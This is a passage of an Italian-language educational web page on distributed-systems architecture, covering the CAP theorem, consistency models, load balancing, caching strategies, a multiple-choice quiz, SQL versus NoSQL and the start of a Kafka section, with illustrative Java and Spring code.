public CompletableFuture&lt;Response&gt; callBackend(Request request) {
    return CompletableFuture.supplyAsync(() -> backendClient.call(request));
}</code></pre>
            </section>

            <!-- CAP Theorem Section -->
            <section class="section" id="modulo3-cap">
                <h2>CAP Theorem</h2>

                <p>Il <strong>CAP Theorem</strong> (Brewer's Theorem) afferma che un sistema distribuito può garantire al massimo <strong>due</strong> delle seguenti tre proprietà contemporaneamente.</p>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                            CAP THEOREM                                      │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│                          CONSISTENCY                                        │
│                              (C)                                            │
│                               ▲                                             │
│                              ╱ ╲                                            │
│                             ╱   ╲                                           │
│                            ╱     ╲                                          │
│                           ╱       ╲                                         │
│                          ╱   CA    ╲                                        │
│                         ╱  (RDBMS)  ╲                                       │
│                        ╱  Single node╲                                      │
│                       ╱───────────────╲                                     │
│                      ╱                 ╲                                    │
│                     ╱        CP         ╲                                   │
│                    ╱    (MongoDB,        ╲                                  │
│                   ╱      HBase,           ╲                                 │
│                  ╱       Redis Cluster)    ╲                                │
│                 ╱─────────────────────────────╲                             │
│                ╱                               ╲                            │
│               ╱             AP                  ╲                           │
│              ╱        (Cassandra,                ╲                          │
│             ╱          DynamoDB,                  ╲                         │
│            ╱           CouchDB)                    ╲                        │
│           ▼─────────────────────────────────────────▼                       │
│     AVAILABILITY                              PARTITION                     │
│         (A)                                   TOLERANCE                     │
│                                                  (P)                        │
│                                                                             │
│   ═══════════════════════════════════════════════════════════════════════   │
│                                                                             │
│   C - Consistency: Ogni lettura riceve la scrittura più recente             │
│                    (o un errore)                                            │
│                                                                             │
│   A - Availability: Ogni richiesta riceve una risposta                      │
│                     (non necessariamente i dati più recenti)                │
│                                                                             │
│   P - Partition Tolerance: Il sistema continua a funzionare                 │
│                            nonostante perdita di messaggi tra nodi          │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <div class="info-box warning">
                    <h4>Interpretazione corretta del CAP</h4>
                    <p>Il CAP theorem è spesso frainteso. In un sistema distribuito reale, le <strong>partition</strong> (network failure) ACCADONO. Quindi la vera scelta è tra <strong>CP</strong> e <strong>AP</strong> durante una partition:<br><br>
                    <strong>CP</strong>: Durante una partition, rifiuta le richieste per garantire consistency<br>
                    <strong>AP</strong>: Durante una partition, continua a servire richieste (possibilmente dati stale)</p>
                </div>

                <h3>PACELC: Estensione del CAP</h3>

                <p>Il modello <strong>PACELC</strong> estende il CAP: se c'è una Partition (P), scegli tra Availability e Consistency (AC); Else (E), quando il sistema funziona normalmente, scegli tra Latency e Consistency (LC).</p>

                <table>
                    <thead>
                        <tr>
                            <th>Sistema</th>
                            <th>Durante Partition (PAC)</th>
                            <th>Else (ELC)</th>
                            <th>Classificazione</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td>DynamoDB, Cassandra</td>
                            <td>Availability</td>
                            <td>Latency</td>
                            <td>PA/EL</td>
                        </tr>
                        <tr>
                            <td>MongoDB, HBase</td>
                            <td>Consistency</td>
                            <td>Consistency</td>
                            <td>PC/EC</td>
                        </tr>
                        <tr>
                            <td>PNUTS (Yahoo)</td>
                            <td>Consistency</td>
                            <td>Latency</td>
                            <td>PC/EL</td>
                        </tr>
                    </tbody>
                </table>

                <h3>Consistency Models</h3>

                <pre><code class="language-java">// Strong Consistency (CP systems)
// Ogni lettura vede l'ultima scrittura
// Esempio: transazione bancaria
public void transfer(Account from, Account to, BigDecimal amount) {
    // DEVE essere consistente - non possiamo avere soldi "persi"
    transactionTemplate.execute(status -> {
        from.debit(amount);
        to.credit(amount);
        return null;
    });
}

// Eventual Consistency (AP systems)
// Le letture potrebbero vedere dati stale, ma convergeranno
// Esempio: contatore like su un social network
public void incrementLikes(String postId) {
    // Okay se per qualche secondo utenti diversi vedono conteggi diversi
    cassandraTemplate.update(
        Query.query(where("id").is(postId)),
        Update.update("likes", QueryBuilder.incr())
    );
}

// Read-your-writes Consistency
// Garantisce che TU veda le TUE scritture
// Esempio: aggiornamento profilo utente
@Service
public class ProfileService {
    public Profile updateProfile(String userId, ProfileUpdate update) {
        Profile updated = repository.save(update);
        // Forza la lettura dal primary per questo utente
        sessionCache.put(userId, updated);
        return updated;
    }

    public Profile getProfile(String userId, String requestingUserId) {
        if (userId.equals(requestingUserId)) {
            // Utente che legge il proprio profilo - usa cache/primary
            return sessionCache.getOrDefault(userId,
                () -> repository.findByIdFromPrimary(userId));
        }
        // Altri utenti - eventual consistency ok
        return repository.findById(userId);
    }
}</code></pre>
            </section>

            <!-- Load Balancing Section -->
            <section class="section" id="modulo3-loadbalancing">
                <h2>Load Balancing</h2>

                <p>Il <strong>Load Balancing</strong> distribuisce il traffico tra multiple istanze di un servizio per migliorare availability, throughput e latenza.</p>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                       LOAD BALANCING STRATEGIES                             │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   1. ROUND ROBIN                                                            │
│   ──────────────                                                            │
│                                                                             │
│   Request 1 ──────► Server A                                                │
│   Request 2 ──────► Server B                                                │
│   Request 3 ──────► Server C                                                │
│   Request 4 ──────► Server A  (ricomincia)                                  │
│                                                                             │
│   Pro: Semplice, distribuzione equa                                         │
│   Contro: Non considera il carico effettivo dei server                      │
│                                                                             │
│   ─────────────────────────────────────────────────────────────────────     │
│                                                                             │
│   2. LEAST CONNECTIONS                                                      │
│   ────────────────────                                                      │
│                                                                             │
│   Server A: 5 connections  ◄────── Request (va qui, meno connessioni)       │
│   Server B: 12 connections                                                  │
│   Server C: 8 connections                                                   │
│                                                                             │
│   Pro: Adatta al carico reale                                               │
│   Contro: Non considera la "pesantezza" delle connessioni                   │
│                                                                             │
│   ─────────────────────────────────────────────────────────────────────     │
│                                                                             │
│   3. WEIGHTED ROUND ROBIN                                                   │
│   ────────────────────────                                                  │
│                                                                             │
│   Server A (weight=5): riceve 5 richieste                                   │
│   Server B (weight=3): riceve 3 richieste  } ogni 10 richieste              │
│   Server C (weight=2): riceve 2 richieste                                   │
│                                                                             │
│   Pro: Server più potenti ricevono più traffico                             │
│   Contro: Richiede configurazione manuale dei pesi                          │
│                                                                             │
│   ─────────────────────────────────────────────────────────────────────     │
│                                                                             │
│   4. CONSISTENT HASHING                                                     │
│   ──────────────────────                                                    │
│                                                                             │
│                    ┌───────────────────┐                                    │
│                   ╱                     ╲                                   │
│                  ╱    Hash Ring          ╲                                  │
│                 │                         │                                 │
│                 │  A ●         ● B        │                                 │
│                 │       user123           │                                 │
│                 │          ↓              │                                 │
│                 │      ● C    ● D         │                                 │
│                  ╲                       ╱                                  │
│                   ╲                     ╱                                   │
│                    └───────────────────┘                                    │
│                                                                             │
│   user123 → hash → posizione sul ring → server più vicino (in senso orario)│
│                                                                             │
│   Pro: Aggiunta/rimozione server sposta solo 1/n delle chiavi              │
│   Contro: Possibile distribuzione non uniforme (risolto con virtual nodes) │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <h3>L4 vs L7 Load Balancing</h3>

                <table>
                    <thead>
                        <tr>
                            <th>Caratteristica</th>
                            <th>L4 (Transport Layer)</th>
                            <th>L7 (Application Layer)</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><strong>Opera su</strong></td>
                            <td>TCP/UDP (IP + porta)</td>
                            <td>HTTP/HTTPS (headers, path, cookies)</td>
                        </tr>
                        <tr>
                            <td><strong>Performance</strong></td>
                            <td>Molto alta (no parsing)</td>
                            <td>Più bassa (deve parsare HTTP)</td>
                        </tr>
                        <tr>
                            <td><strong>Routing</strong></td>
                            <td>Solo per IP/porta</td>
                            <td>Per path, header, cookie, ecc.</td>
                        </tr>
                        <tr>
                            <td><strong>SSL Termination</strong></td>
                            <td>No (passa attraverso)</td>
                            <td>Sì</td>
                        </tr>
                        <tr>
                            <td><strong>Esempi</strong></td>
                            <td>AWS NLB, HAProxy (TCP mode)</td>
                            <td>AWS ALB, Nginx, HAProxy (HTTP mode)</td>
                        </tr>
                    </tbody>
                </table>

                <pre><code class="language-java">// Client-side load balancing con Spring Cloud LoadBalancer
@Configuration
public class LoadBalancerConfig {

    @Bean
    @LoadBalanced  // Abilita load balancing su RestTemplate
    public RestTemplate restTemplate() {
        return new RestTemplate();
    }
}

@Service
public class OrderService {
    private final RestTemplate restTemplate;

    public User getUser(Long userId) {
        // "user-service" è il nome del servizio in service discovery
        // Spring risolve automaticamente a un'istanza disponibile
        return restTemplate.getForObject(
            "http://user-service/api/users/{id}",
            User.class,
            userId
        );
    }
}

// Custom load balancer con Spring Cloud LoadBalancer
@Configuration
public class CustomLoadBalancerConfig {

    @Bean
    public ReactorLoadBalancer&lt;ServiceInstance&gt; customLoadBalancer(
            ServiceInstanceListSupplier supplier) {
        return new RoundRobinLoadBalancer(supplier, "user-service");
    }

    // Oppure implementazione custom
    @Bean
    public ReactorLoadBalancer&lt;ServiceInstance&gt; weightedLoadBalancer(
            ServiceInstanceListSupplier supplier) {
        return new ReactorServiceInstanceLoadBalancer() {
            @Override
            public Mono&lt;Response&lt;ServiceInstance&gt;&gt; choose(Request request) {
                return supplier.get()
                    .next()
                    .map(instances -> {
                        // Logica custom: scegli in base a weight nei metadata
                        ServiceInstance chosen = selectByWeight(instances);
                        return new DefaultResponse(chosen);
                    });
            }
        };
    }
}</code></pre>
            </section>

            <!-- Caching Section -->
            <section class="section" id="modulo3-caching">
                <h2>Caching Strategies</h2>

                <p>Il <strong>Caching</strong> è fondamentale per la scalabilità. Una cache ben progettata può ridurre il carico sul database di ordini di grandezza e migliorare drasticamente la latency.</p>

                <h3>Caching Patterns</h3>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                         CACHING PATTERNS                                    │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   1. CACHE-ASIDE (Lazy Loading)                                             │
│   ─────────────────────────────                                             │
│                                                                             │
│   ┌─────────┐      1. Get        ┌─────────┐                                │
│   │   App   │─────────────────►│  Cache  │                                 │
│   │         │◄─────────────────│         │                                 │
│   │         │      2. Miss       └─────────┘                                │
│   │         │                                                               │
│   │         │      3. Get        ┌─────────┐                                │
│   │         │─────────────────►│   DB    │                                 │
│   │         │◄─────────────────│         │                                 │
│   │         │      4. Return     └─────────┘                                │
│   │         │                                                               │
│   │         │      5. Put        ┌─────────┐                                │
│   │         │─────────────────►│  Cache  │                                 │
│   └─────────┘                    └─────────┘                                │
│                                                                             │
│   Pro: Solo dati richiesti in cache, resiliente a cache failure             │
│   Contro: Cache miss penalty, possibile stale data                          │
│                                                                             │
│   ─────────────────────────────────────────────────────────────────────     │
│                                                                             │
│   2. WRITE-THROUGH                                                          │
│   ────────────────                                                          │
│                                                                             │
│   ┌─────────┐      1. Write      ┌─────────┐      2. Write   ┌─────────┐   │
│   │   App   │─────────────────►│  Cache  │───────────────►│   DB    │    │
│   │         │◄─────────────────│         │◄───────────────│         │    │
│   └─────────┘      4. ACK        └─────────┘      3. ACK     └─────────┘   │
│                                                                             │
│   Pro: Cache sempre consistente con DB                                      │
│   Contro: Latenza scrittura alta (2 write sincrone)                         │
│                                                                             │
│   ─────────────────────────────────────────────────────────────────────     │
│                                                                             │
│   3. WRITE-BEHIND (Write-Back)                                              │
│   ────────────────────────────                                              │
│                                                                             │
│   ┌─────────┐      1. Write      ┌─────────┐                                │
│   │   App   │─────────────────►│  Cache  │                                 │
│   │         │◄─────────────────│         │                                 │
│   └─────────┘      2. ACK        │         │                                │
│                     (immediato)  │         │      3. Async    ┌─────────┐   │
│                                  │         │      batch write │   DB    │   │
│                                  │         │─────────────────►│         │   │
│                                  └─────────┘                  └─────────┘   │
│                                                                             │
│   Pro: Latenza scrittura bassa, batch writes                                │
│   Contro: Rischio perdita dati se cache crasha prima del flush              │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <h3>Cache Invalidation Strategies</h3>

                <pre><code class="language-java">// 1. TTL-based expiration
@Cacheable(value = "users", key = "#userId")
@CacheConfig(cacheNames = "users")
public User getUser(Long userId) {
    return userRepository.findById(userId).orElseThrow();
}

// application.yml - TTL configuration
spring:
  cache:
    type: redis
    redis:
      time-to-live: 3600000  # 1 ora in millisecondi

// 2. Event-driven invalidation
@Service
public class UserService {

    @CacheEvict(value = "users", key = "#user.id")
    public User updateUser(User user) {
        User updated = userRepository.save(user);
        // Pubblica evento per invalidare cache su altri nodi
        eventPublisher.publish(new UserUpdatedEvent(user.getId()));
        return updated;
    }
}

@Component
public class CacheInvalidationListener {

    @EventListener
    public void onUserUpdated(UserUpdatedEvent event) {
        cacheManager.getCache("users").evict(event.getUserId());
    }
}

// 3. Cache versioning (per invalidazione di massa)
@Service
public class ProductCatalogService {

    private final AtomicLong catalogVersion = new AtomicLong(0);

    @Cacheable(value = "products", key = "#productId + '-' + @productCatalogService.catalogVersion")
    public Product getProduct(Long productId) {
        return productRepository.findById(productId).orElseThrow();
    }

    public void refreshCatalog() {
        catalogVersion.incrementAndGet();  // Invalida tutte le entry
    }

    public long getCatalogVersion() {
        return catalogVersion.get();
    }
}</code></pre>

                <h3>Redis vs Memcached</h3>

                <table>
                    <thead>
                        <tr>
                            <th>Caratteristica</th>
                            <th>Redis</th>
                            <th>Memcached</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><strong>Data structures</strong></td>
                            <td>String, List, Set, Hash, Sorted Set, Stream</td>
                            <td>Solo String (key-value)</td>
                        </tr>
                        <tr>
                            <td><strong>Persistence</strong></td>
                            <td>RDB snapshots, AOF log</td>
                            <td>No (solo in-memory)</td>
                        </tr>
                        <tr>
                            <td><strong>Replication</strong></td>
                            <td>Master-replica, Redis Cluster</td>
                            <td>No built-in</td>
                        </tr>
                        <tr>
                            <td><strong>Pub/Sub</strong></td>
                            <td>Sì</td>
                            <td>No</td>
                        </tr>
                        <tr>
                            <td><strong>Lua scripting</strong></td>
                            <td>Sì</td>
                            <td>No</td>
                        </tr>
                        <tr>
                            <td><strong>Memory efficiency</strong></td>
                            <td>Moderata (overhead strutture dati)</td>
                            <td>Alta (slab allocator ottimizzato)</td>
                        </tr>
                        <tr>
                            <td><strong>Use case ideale</strong></td>
                            <td>Cache + session + queue + leaderboard</td>
                            <td>Simple caching ad alto throughput</td>
                        </tr>
                    </tbody>
                </table>

                <pre><code class="language-java">// Distributed locking con Redis (Redisson)
@Service
public class InventoryService {

    private final RedissonClient redisson;

    public boolean reserveStock(String productId, int quantity) {
        RLock lock = redisson.getLock("inventory:" + productId);

        try {
            // Acquisisce lock con timeout
            if (lock.tryLock(5, 30, TimeUnit.SECONDS)) {
                try {
                    int currentStock = getStock(productId);
                    if (currentStock >= quantity) {
                        updateStock(productId, currentStock - quantity);
                        return true;
                    }
                    return false;
                } finally {
                    lock.unlock();
                }
            }
            throw new LockAcquisitionException("Could not acquire lock");
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
            throw new RuntimeException(e);
        }
    }
}

// Rate limiting con Redis
@Service
public class RateLimiter {

    private final StringRedisTemplate redis;

    public boolean isAllowed(String userId, int maxRequests, Duration window) {
        String key = "ratelimit:" + userId;
        long now = System.currentTimeMillis();
        long windowStart = now - window.toMillis();

        // Sliding window log algorithm
        redis.opsForZSet().removeRangeByScore(key, 0, windowStart);

        Long count = redis.opsForZSet().zCard(key);
        if (count != null && count >= maxRequests) {
            return false;
        }

        redis.opsForZSet().add(key, String.valueOf(now), now);
        redis.expire(key, window);
        return true;
    }
}</code></pre>

                <div class="info-box warning">
                    <h4>Cache Stampede (Thundering Herd)</h4>
                    <p>Quando una chiave popolare scade, molte richieste simultanee potrebbero tutte andare al DB. Soluzioni:<br><br>
                    1. <strong>Locking</strong>: Solo una richiesta rigenera la cache<br>
                    2. <strong>Probabilistic early expiration</strong>: Rigenera prima della scadenza<br>
                    3. <strong>Background refresh</strong>: Thread separato che aggiorna la cache</p>
                </div>
            </section>

            <!-- Quiz Section Module 3 -->
            <section class="quiz-section" id="modulo3-quiz">
                <h2>Interactive Challenge Quiz - Architettura</h2>
                <p style="color: var(--text-secondary); margin-bottom: 30px;">Verifica la tua comprensione di architettura e scalabilità.</p>

                <!-- Question 11 -->
                <div class="quiz-question" data-correct="c">
                    <h4><span>Q1.</span> Un Circuit Breaker è nello stato HALF-OPEN. Cosa succede se la prossima richiesta fallisce?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q11" id="q11a" value="a">
                            <label for="q11a">Rimane in HALF-OPEN e permette un'altra richiesta di test</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q11" id="q11b" value="b">
                            <label for="q11b">Torna in CLOSED perché ha già aspettato abbastanza</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q11" id="q11c" value="c">
                            <label for="q11c">Torna in OPEN e ricomincia il timeout</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q11" id="q11d" value="d">
                            <label for="q11d">Entra in uno stato DISABLED permanente</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q11')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q11"></div>
                </div>

                <!-- Question 12 -->
                <div class="quiz-question" data-correct="b">
                    <h4><span>Q2.</span> Secondo il CAP theorem, durante una network partition, un sistema che sceglie <strong>Availability</strong> su <strong>Consistency</strong>...</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q12" id="q12a" value="a">
                            <label for="q12a">Rifiuta tutte le scritture ma permette le letture</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q12" id="q12b" value="b">
                            <label for="q12b">Continua a servire richieste, anche se i dati potrebbero essere stale o divergenti tra nodi</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q12" id="q12c" value="c">
                            <label for="q12c">Blocca tutte le richieste finché la partition non si risolve</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q12" id="q12d" value="d">
                            <label for="q12d">Elegge automaticamente un nuovo leader per mantenere consistency</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q12')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q12"></div>
                </div>

                <!-- Question 13 -->
                <div class="quiz-question" data-correct="a">
                    <h4><span>Q3.</span> Quale caching pattern è più appropriato per un sistema dove la latenza di scrittura è critica e una piccola perdita di dati in caso di crash è accettabile?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q13" id="q13a" value="a">
                            <label for="q13a"><strong>Write-Behind</strong> - scrive in cache e poi asincronamente al DB</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q13" id="q13b" value="b">
                            <label for="q13b"><strong>Write-Through</strong> - scrive sincronamente sia in cache che DB</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q13" id="q13c" value="c">
                            <label for="q13c"><strong>Cache-Aside</strong> - l'applicazione gestisce manualmente cache e DB</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q13" id="q13d" value="d">
                            <label for="q13d"><strong>Read-Through</strong> - la cache carica automaticamente dal DB</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q13')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q13"></div>
                </div>

                <!-- Question 14 -->
                <div class="quiz-question" data-correct="d">
                    <h4><span>Q4.</span> Perché il Consistent Hashing è preferito al semplice hash modulo N per il load balancing di cache distribuite?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q14" id="q14a" value="a">
                            <label for="q14a">Perché è più veloce da calcolare</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q14" id="q14b" value="b">
                            <label for="q14b">Perché garantisce una distribuzione perfettamente uniforme</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q14" id="q14c" value="c">
                            <label for="q14c">Perché supporta più tipi di dati rispetto all'hash tradizionale</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q14" id="q14d" value="d">
                            <label for="q14d">Perché quando si aggiunge/rimuove un nodo, solo una frazione delle chiavi deve essere rimappata</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q14')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q14"></div>
                </div>

                <!-- Question 15 -->
                <div class="quiz-question" data-correct="c">
                    <h4><span>Q5.</span> Un team sta decidendo tra microservizi e monolite per una nuova startup. Quale fattore dovrebbe pesare di PIÙ verso la scelta del monolite?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q15" id="q15a" value="a">
                            <label for="q15a">L'applicazione avrà milioni di utenti</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q15" id="q15b" value="b">
                            <label for="q15b">Il team ha esperienza con Kubernetes</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q15" id="q15c" value="c">
                            <label for="q15c">Il dominio di business non è ancora ben definito e cambierà frequentemente</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q15" id="q15d" value="d">
                            <label for="q15d">Diverse parti del sistema avranno requisiti di scaling molto diversi</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q15')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q15"></div>
                </div>
            </section>

            <!-- ==================== MODULO 4: DATABASE & MESSAGING ==================== -->

            <header class="module-header" id="modulo4" style="margin-top: 80px;">
                <span class="module-tag">Modulo 4</span>
                <h1>Database & Messaging</h1>
                <p>SQL vs NoSQL, event streaming con Kafka, message broker con RabbitMQ</p>
            </header>

            <!-- SQL vs NoSQL Section -->
            <section class="section" id="modulo4-sql-nosql">
                <h2>SQL vs NoSQL</h2>

                <p>La scelta tra database relazionali (SQL) e non relazionali (NoSQL) dipende dai requisiti specifici dell'applicazione. Non esiste una soluzione universalmente migliore.</p>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                         DATABASE LANDSCAPE                                  │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   SQL (Relational)                  NoSQL                                   │
│   ────────────────                  ─────                                   │
│                                                                             │
│   ┌─────────────────┐               ┌─────────────────┐                     │
│   │   PostgreSQL    │               │   Document DB   │                     │
│   │   MySQL         │               │   ─────────────  │                     │
│   │   Oracle        │               │   MongoDB       │                     │
│   │   SQL Server    │               │   CouchDB       │                     │
│   └─────────────────┘               └─────────────────┘                     │
│                                                                             │
│   Structured data                   ┌─────────────────┐                     │
│   ACID transactions                 │   Key-Value     │                     │
│   Complex queries/joins             │   ───────────   │                     │
│   Strong consistency                │   Redis         │                     │
│                                     │   DynamoDB      │                     │
│                                     │   Memcached     │                     │
│                                     └─────────────────┘                     │
│                                                                             │
│                                     ┌─────────────────┐                     │
│                                     │   Wide-Column   │                     │
│                                     │   ────────────  │                     │
│                                     │   Cassandra     │                     │
│                                     │   HBase         │                     │
│                                     │   ScyllaDB      │                     │
│                                     └─────────────────┘                     │
│                                                                             │
│                                     ┌─────────────────┐                     │
│                                     │   Graph DB      │                     │
│                                     │   ────────────  │                     │
│                                     │   Neo4j         │                     │
│                                     │   Amazon Neptune│                     │
│                                     └─────────────────┘                     │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <h3>Confronto dettagliato</h3>

                <table>
                    <thead>
                        <tr>
                            <th>Caratteristica</th>
                            <th>SQL</th>
                            <th>NoSQL</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><strong>Schema</strong></td>
                            <td>Rigido, predefinito</td>
                            <td>Flessibile, schema-on-read</td>
                        </tr>
                        <tr>
                            <td><strong>Scaling</strong></td>
                            <td>Verticale (scale-up)</td>
                            <td>Orizzontale (scale-out)</td>
                        </tr>
                        <tr>
                            <td><strong>Transactions</strong></td>
                            <td>ACID garantito</td>
                            <td>BASE (eventual consistency) o ACID limitato</td>
                        </tr>
                        <tr>
                            <td><strong>Query</strong></td>
                            <td>SQL standard, JOIN potenti</td>
                            <td>Query language specifico, no JOIN (o limitati)</td>
                        </tr>
                        <tr>
                            <td><strong>Data model</strong></td>
                            <td>Tabelle normalizzate</td>
                            <td>Denormalizzato, ottimizzato per access pattern</td>
                        </tr>
                        <tr>
                            <td><strong>Use cases</strong></td>
                            <td>OLTP, dati strutturati, relazioni complesse</td>
                            <td>Big data, real-time, dati semi-strutturati</td>
                        </tr>
                    </tbody>
                </table>

                <div class="info-box">
                    <h4>ACID vs BASE</h4>
                    <p><strong>ACID</strong>: Atomicity, Consistency, Isolation, Durability - garanzie forti, tipiche dei database SQL.<br><br>
                    <strong>BASE</strong>: Basically Available, Soft state, Eventually consistent - modello più rilassato dei database NoSQL distribuiti, che privilegia availability e partition tolerance.</p>
                </div>

                <h3>Quando usare cosa</h3>

                <pre><code class="language-java">// SQL - Ideale per:
// 1. Transazioni finanziarie (ACID critico)
@Transactional
public void transferMoney(Long fromAccount, Long toAccount, BigDecimal amount) {
    Account from = accountRepository.findById(fromAccount).orElseThrow();
    Account to = accountRepository.findById(toAccount).orElseThrow();

    from.debit(amount);
    to.credit(amount);

    accountRepository.save(from);
    accountRepository.save(to);
    // Se qualcosa fallisce, TUTTO viene rollbackato
}

// 2. Query complesse con JOIN
@Query("""
    SELECT new com.example.OrderSummary(
        o.id, c.name, p.name, oi.quantity, oi.price
    )
    FROM Order o
    JOIN o.customer c
    JOIN o.items oi
    JOIN oi.product p
    WHERE o.createdAt > :since
    AND c.tier = 'PREMIUM'
    ORDER BY o.total DESC
    """)
List&lt;OrderSummary&gt; findPremiumOrdersSince(@Param("since") LocalDateTime since);

// 3. Dati altamente relazionali
// User -> Orders -> OrderItems -> Products -> Categories -> ...


// NoSQL (MongoDB) - Ideale per:
// 1. Documenti con struttura variabile
@Document(collection = "products")
public class Product {
    @Id
    private String id;
    private String name;
    private Map&lt;String, Object&gt; attributes;  // Schema flessibile!
    // Un laptop ha: cpu, ram, storage
    // Una maglietta ha: size, color, material
}

// 2. Dati denormalizzati per read performance
@Document(collection = "orders")
public class Order {
    @Id
    private String id;

    // Embedded, non riferimento - evita JOIN
    private CustomerSnapshot customer;
    private List&lt;OrderItemSnapshot&gt; items;

    // Tutto ciò che serve per visualizzare l'ordine in un solo read
}

// 3. High write throughput (time-series, logging)
@Document(collection = "events")
public class AnalyticsEvent {
    private Instant timestamp;
    private String eventType;
    private Map&lt;String, Object&gt; payload;
}</code></pre>

                <div class="info-box warning">
                    <h4>Domanda da colloquio</h4>
                    <p>"Come gestiresti una relazione many-to-many in MongoDB?"<br><br>
                    <strong>Risposta:</strong> Dipende dall'access pattern! (1) Se leggo sempre gli utenti con i loro ruoli: embed array di ruoli nel documento utente. (2) Se leggo spesso i ruoli per vedere quali utenti li hanno: array di userId nel documento ruolo. (3) Se entrambi: duplicazione (denormalizzazione) con gestione manuale della consistency, oppure collection separata di "link" e aggregation pipeline.</p>
                </div>

                <h3>Polyglot Persistence</h3>

                <p>I sistemi moderni spesso usano <strong>più database</strong> per scopi diversi:</p>

                <pre><code class="language-java">// Esempio di architettura polyglot
@Service
public class EcommerceService {

    // PostgreSQL - Ordini, transazioni (ACID)
    private final OrderRepository orderRepository;  // JPA

    // MongoDB - Catalogo prodotti (schema flessibile)
    private final ProductRepository productRepository;  // Spring Data MongoDB

    // Redis - Sessioni, cache, rate limiting
    private final StringRedisTemplate redisTemplate;

    // Elasticsearch - Ricerca full-text
    private final ElasticsearchOperations elasticOps;

    // Neo4j - Raccomandazioni (grafi)
    private final RecommendationRepository recommendationRepo;

    public SearchResult search(String query) {
        // Elasticsearch per ricerca
        return elasticOps.search(query, Product.class);
    }

    public List&lt;Product&gt; getRecommendations(Long userId) {
        // Neo4j: "utenti che hanno comprato X hanno anche comprato Y"
        return recommendationRepo.findRecommendationsFor(userId);
    }

    @Transactional
    public Order placeOrder(OrderRequest request) {
        // PostgreSQL per transazione ACID
        return orderRepository.save(createOrder(request));
    }
}</code></pre>
            </section>

            <!-- Kafka Section -->
            <section class="section" id="modulo4-kafka">
                <h2>Apache Kafka - Event Streaming</h2>

                <p><strong>Apache Kafka</strong> è una piattaforma di event streaming distribuita, progettata per gestire flussi di dati in tempo reale con alto throughput, durabilità e fault tolerance.</p>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                         KAFKA ARCHITECTURE                                  │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   Producers                    Kafka Cluster                   Consumers   │
│   ─────────                    ─────────────                   ─────────   │
│                                                                             │
│   ┌─────────┐                  ┌─────────────────────────┐                  │
│   │Producer │──publish──►     │     Topic: orders        │                  │
│   │   A     │                  │  ┌─────┬─────┬─────┐    │                  │
│   └─────────┘                  │  │ P0  │ P1  │ P2  │    │    ┌──────────┐ │
│                                │  ├─────┼─────┼─────┤    │───►│Consumer  │ │
│   ┌─────────┐                  │  │msg1 │msg2 │msg4 │    │    │Group A   │ │
│   │Producer │──publish──►     │  │msg3 │msg5 │msg7 │    │    │┌────────┐│ │
│   │   B     │                  │  │msg6 │msg8 │     │    │    ││C1 (P0) ││ │
│   └─────────┘                  │  └─────┴─────┴─────┘    │    ││C2 (P1) ││ │
│                                │                         │    ││C3 (P2) ││ │
│                                │  Partitions             │    │└────────┘│ │
│                                │  (parallelism unit)     │    └──────────┘ │
